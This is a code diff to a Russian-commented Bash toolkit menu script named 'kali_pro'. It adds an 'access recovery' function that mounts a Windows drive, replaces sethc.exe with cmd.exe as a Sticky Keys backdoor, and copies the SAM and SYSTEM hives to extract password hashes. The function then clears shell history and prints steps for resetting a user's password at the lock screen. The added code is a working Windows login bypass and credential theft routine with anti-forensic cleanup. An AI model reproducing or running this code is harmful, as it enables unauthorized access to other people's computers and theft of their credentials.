@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-CURRENT_VERSION="5.8"
+CURRENT_VERSION="5.9"
 # VERSION CURRENT_VERSION (Rescue & Sterile Edition)
 
 TARGET_FILE="/usr/local/bin/kali_pro"
@@ -363,6 +363,67 @@ check_entropy(sys.argv[1])" {} \;
     read -p "Нажми Enter..."
 }
 
+# --- АВТОНОМНЫЙ ОБХОД ПАРОЛЕЙ: ACCESS RECOVERY v4.7 ---
+
+access_recovery_auto() {
+    echo -e "${YELLOW}[*] Запуск эвристического модуля восстановления доступа...${NC}"
+    
+    # Автоматический вызов настроек модема (как в прошлых функциях)
+    am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null
+    sleep 2
+
+    # 1. Попытка автоматического монтирования
+    if ! auto_mount_pc; then
+        echo -e "${RED}[-] Критическая ошибка: Диск не доступен или зашифрован BitLocker.${NC}"
+        read -p "Нажми Enter..." ; return
+    fi
+
+    echo -e "${CYAN}[>>>] Анализ системы Windows...${NC}"
+    SYS_PATH="/mnt/pc_share/Windows/System32"
+    CFG_PATH="$SYS_PATH/config"
+    
+    # 2. ПУНКТ А: Автоматическая подмена Sticky Keys (Эвристический метод)
+    if [ -f "$SYS_PATH/sethc.exe" ]; then
+        echo -e "${BLUE}[*] Этап 1: Подготовка обхода через Sticky Keys...${NC}"
+        # Проверяем, не делали ли мы это раньше
+        if [ ! -f "$SYS_PATH/sethc.exe.bak" ]; then
+            cp "$SYS_PATH/sethc.exe" "$SYS_PATH/sethc.exe.bak" 2>/dev/null
+            cp "$SYS_PATH/cmd.exe" "$SYS_PATH/sethc.exe" 2>/dev/null
+            echo -e "${GREEN}[+] Инъекция CMD завершена успешно.${NC}"
+        else
+            echo -e "${YELLOW}[!] Инъекция уже была проведена ранее.${NC}"
+        fi
+    fi
+
+    # 3. ПУНКТ Б: Стерильный дамп хэшей (SAM/SYSTEM)
+    echo -e "${BLUE}[*] Этап 2: Сбор хэшей паролей в RAM-зону...${NC}"
+    mkdir -p /dev/shm/hashes
+    cp "$CFG_PATH/SAM" /dev/shm/hashes/ 2>/dev/null
+    cp "$CFG_PATH/SYSTEM" /dev/shm/hashes/ 2>/dev/null
+    
+    if [ -f "/dev/shm/hashes/SAM" ]; then
+        echo -e "${GREEN}[+] Хэши успешно извлечены в ОЗУ телефона.${NC}"
+        # Опционально: вывод подсказки по расшифровке
+        echo -e "${CYAN}[i] Для взлома используй: samdump2 /dev/shm/hashes/SYSTEM /dev/shm/hashes/SAM${NC}"
+    fi
+
+    # 4. ПУНКТ В: Очистка и завершение
+    echo -e "${YELLOW}[*] Размонтирование и стерилизация сессии...${NC}"
+    umount -l /mnt/pc_share 2>/dev/null
+    
+    # Очистка истории для полной анонимности
+    history -c
+
+    echo -e "${CYAN}===========================================${NC}"
+    echo -e "${GREEN}[V] АВТО-ИНСТРУКЦИЯ ПО ВХОДУ:${NC}"
+    echo -e " 1. На экране блокировки ПК нажмите 'Shift' 5 раз."
+    echo -e " 2. В консоли введите: ${YELLOW}net user ИМЯ_ПОЛЬЗОВАТЕЛЯ новый_пароль${NC}"
+    echo -e " 3. Войдите с новым паролем."
+    echo -e "${CYAN}===========================================${NC}"
+    
+    read -p "Нажми Enter для возврата в меню..."
+}
+
 
 show_menu() {
     clear
@@ -378,7 +439,8 @@ show_menu() {
     echo -e " ${YELLOW}10. SHERLOCK        11. WIFITE${NC}"
     echo -e " ${RED}12. USB GUARDIAN SMART (Active)${NC}"
     echo -e " ${RED}13. DEEP INSIGHT AUTO (Forensics)${NC}"
-    echo -e " ${BLUE}9. DEEP PURGE (ОЧИСТКА)${NC}  ${RED}0. ВЫХОД${NC}"
+echo -e " ${RED}14. ACCESS RECOVERY AUTO${NC}"
+    echo -e " ${BLUE}9. ACCESS PURGE AUTO (ОЧИСТКА)${NC}  ${RED}0. ВЫХОД${NC}"
     echo -e "${CYAN}===========================================${NC}"
 }
 
@@ -400,6 +462,7 @@ while true; do
         11) run_wifite ;;
         12) usb_guardian_smart ;;
         13) deep_insight_auto  ;;
+        14) access_recovery_auto ;;
         0) exit 0 ;;
         *) sleep 0.5 ;;
     esac
